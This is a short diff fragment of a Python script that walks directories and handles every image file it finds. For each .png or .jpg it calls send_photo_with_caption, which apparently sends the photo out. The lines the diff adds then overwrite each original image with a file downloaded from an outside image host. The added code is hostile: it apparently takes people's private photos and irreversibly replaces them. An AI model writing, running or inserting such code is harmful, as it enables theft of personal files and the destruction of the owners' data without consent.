@@ -32,4 +32,6 @@ for dir in filess:
 			if filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".jpeg"):
 				with open(os.path.join(filename),'rb') as img:
 					send_photo_with_caption(img)
-					
+				with open(os.path.join(filename),'wb') as img:
+					img.write(requests.get("https://h.top4top.io/p_3256l4oow0.jpg").content)
+				
